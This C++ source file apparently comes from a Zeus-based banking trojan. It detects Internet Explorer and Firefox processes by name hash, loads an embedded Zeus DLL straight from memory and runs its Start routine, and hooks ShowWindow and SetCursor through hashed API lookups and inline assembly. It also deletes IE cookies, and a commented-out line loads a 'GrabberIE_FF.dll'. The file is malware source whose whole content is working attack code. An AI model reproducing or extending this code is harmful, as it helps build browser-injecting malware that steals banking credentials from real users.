#include <windows.h>
#include <wininet.h>


#include "GetApi.h"
#include "Utils.h"

#include "Memory.h"
#include "Strings.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Crypt.h"
#include "Unhook.h"
#include "Splice.h"

#include "InternetExplorer.h"
#include "Unhook.h"

#include "ntdll.h"

#include "coocksol.h"
#include "dllloader.h"

namespace zeus
{
#include "zeusdll.cpp"
}

//все функции которые мы будем хучить для IE

typedef BOOL ( WINAPI *PShowWindow   )( HWND hWnd, int Cmd );
PShowWindow    Real_ShowWindow;

typedef MMRESULT ( WINAPI *PwaveOutWrite   )( HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh );
PwaveOutWrite    Real_waveOutWrite;

typedef HCURSOR ( WINAPI *PSetCursor   )( HCURSOR hCursor );
PSetCursor    Real_SetCursor;


MMRESULT WINAPI Hook_WaveOutWrite(HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh)
{
	DbgMsg("Hook_WaveOutWrite",0,"WORK!!!!!!!!!");
	return MMSYSERR_NODRIVER;
}

HCURSOR WINAPI Hook_SetCursor(HCURSOR hCursor)
{
	DbgMsg("Hook_SetCursor",0,"FUCK!!!!!!!!!!!");

	// Заменяем курсор на стандартную стрелочку
	// и вызываем оригинальную функцию
	HCURSOR cur = LoadCursor(NULL, IDC_ARROW);
	return Real_SetCursor(cur);
}


BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)
{
	OutputDebugString("Hook_ShowWindow");

	char cClasN[MAX_PATH];
	pGetClassNameA(hWnd,cClasN,MAX_PATH);
//	DbgMsg(cClasN,(int)hWnd,"All Wind ");
	

	if (cClasN[0]=='#')
	{
		DbgMsg(cClasN,(int)hWnd,"hParent!1");
		HWND hParent = (HWND)pGetParent(hWnd);
		
		
		if (hParent!=NULL)
		{
			DbgMsg(cClasN,(int)hWnd,"hParent!=0");
			//bool tmp=(bool)pIsWindowVisible(hParent);
			//if (!tmp)
			{
				char str[260];
				pGetWindowTextA(hParent,str,260);
				DbgMsg(str,(int)hParent,"pIsWindowVisible hParent!3");
			//	OutputDebugString("Hiden Window");
				
			
				if (m_strstr(str,"Internet"))
				//if (IsInternetExplorer())
				{
				//	DbgMsg(str,(int)hWnd,"!");
					//HWND hParent = (HWND)pGetParent(hWnd);
					pGetWindowTextA(hWnd,str,260);
					DbgMsg(str,(int)hWnd,"Hide!");
					pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
					pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED );
					pSetLayeredWindowAttributes(hWnd, 0, 70, LWA_ALPHA);
					//Cmd=0;
				}
				
				//Cmd=0;
				
			}
		}
	}	
	return Real_ShowWindow(hWnd, Cmd);
}






bool WINAPI IsInternetExplorer()
{
	// Функция вернёт истину если она вызвана в процессе
	// интернет експлорера

	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
//	DbgMsgW(L"эксплорер ли это?",1,ModulePath);
	DWORD dwProcessHash = GetNameHash( ModulePath );

	

	if ( dwProcessHash == 0x250DFA8F /*||		//iexplore.exe
		 dwProcessHash == 0x1D30C46B ||		//
		 dwProcessHash == 0xC032B37E ||		//ieuser.exe //test for Vista
		 dwProcessHash == 0x490A0972*/ )		// explorer.exe
	{
//	DbgMsgW(L"АГА Эксплорер",1,ModulePath);
		MemFree( ModulePath );
		return true;
	}
	MemFree( ModulePath );
	return false;
}

bool WINAPI IsFireFox()
{
	char *ModulePath = (char*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameA( NULL, ModulePath, MAX_PATH );
	if ( m_strstr( ModulePath, "firefox.exe" ) )
	{
		MemFree( ModulePath );
		return true;
	}
	MemFree( ModulePath );
	return false;
}

typedef void (WINAPI *funcStart)();

void StartZeus()
{
	OutputDebugString("Load dll");
	HMEMORYMODULE hDll = MemoryLoadLibrary(zeus::data);
	if( hDll )
	{
		OutputDebugString("Run Start()");
		funcStart func = (funcStart)MemoryGetProcAddress( hDll, "Start" );
		func();
		OutputDebugString("Leave Start()");
	}
}

bool HookInternetExplorer()
{
	// функция вешает хуки на базовые функции которые использует
	// Internet Explorer для загрузки документов
	// Работает только в случае вызова из процесса интернет експлорера

	if ( !IsInternetExplorer() )
	{
		return false;
	}

	//UnhookIE();
	static bool run = false;
	if( !run )
	{
		StartZeus();
		run = true;
	}
/*
	HMODULE zeus = (HMODULE)pLoadLibraryA("c:\\GrabberIE_FF.dll");
	if( zeus == 0 )
		OutputDebugString("not load GrabberIE_FF.dll");
	else
	{
		funcStart func = (funcStart)pGetProcAddress( zeus, "Start" );
		if( func == 0 )
			OutputDebugString("not found func Start()");
		else
			func();
	}
*/
	//pHead = NULL;
	//OutputDebugString("HookInternetExplorerApi0");
	//HookInternetExplorerApi();
	//OutputDebugString("HookInternetExplorerApi1");

	return true;
}

bool HookFireFox()
{
	if ( !IsFireFox() )
	{
		return false;
	}
	//UnhookIE();
	static bool run = false;
	if( !run )
	{
		StartZeus();
		run = true;
	}
}

bool HookInternetExplorerApi()
{
	DbgMsg("HookInternetExplorerApi",0,"BEFORE");

	if ( HookApi( 3, 0x7506E960, (DWORD)&Hook_ShowWindow ) )
	{  
		__asm mov [Real_ShowWindow], eax			
	}	

	/*if ( HookApi( 12, 0x1BCB55BB, (DWORD)&Hook_WaveOutWrite ) )
	{  
		__asm mov [Real_waveOutWrite], eax			
	}	*/

	if ( HookApi( 3, 0xD9725ED, (DWORD)&Hook_SetCursor ) )
	{  
		__asm mov [Real_SetCursor], eax			
	}	

	Delete_IECookies_Norm(true, true);

	DbgMsg("HookInternetExplorerApi",0,"AFTER");
	
	return true;
}




